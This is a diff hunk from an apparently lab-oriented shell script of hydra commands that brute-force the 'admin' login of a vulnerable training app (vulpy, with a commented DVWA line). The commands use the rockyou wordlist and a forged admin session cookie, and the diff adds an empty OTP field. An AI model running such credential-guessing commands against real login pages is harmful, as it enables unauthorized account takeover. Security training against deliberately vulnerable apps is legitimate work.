@@ -66,15 +66,13 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login:userna
 
 hydra -l admin -P /usr/share/wordlists/rockyou.txt \
   -s 5000 "${VULNBOX_IP}" http-post-form \
-  "/user/login:username=^USER^&password=^PASS^:F=wrong" \
+  "/user/login:username=^USER^&password=^PASS^&otp=:F=wrong" \
   -V -c "vulpy_session=eyJ1c2VybmFtZSI6ICJhZG1pbiJ9"
 
 hydra -l admin -P /usr/share/wordlists/rockyou.txt \
   -s 5000 "${VULNBOX_IP}" http-get-form \
-  "/user/login:username=^USER^&password=^PASS^:F=wrong" \
+  "/user/login:username=^USER^&password=^PASS^&otp=:F=wrong" \
   -V -c "vulpy_session=eyJ1c2VybmFtZSI6ICJhZG1pbiJ9"
-
-hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt http://${VULNBOX_IP}:5000/user http-form-post "/login:username=^USER^&password=^PASS^:Incorrect" -t 4 -f -o "$OUT/hydra_login.txt"
 
 #hydra -l admin -P "${WORDLIST_TO_USE}" "${TARGET_HOST}" http-get-form "${DVWA_BRUTE_FORCE_PATH}:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=${DVWA_PHPSESSID};security=low:F=Username and/or password incorrect." 2>&1 | tee -a "${OUTDIR}/hydra_brute_force.log"
 #HYDRA_EXIT_STATUS=${PIPESTATUS[0]} # Capture hydra's exit status
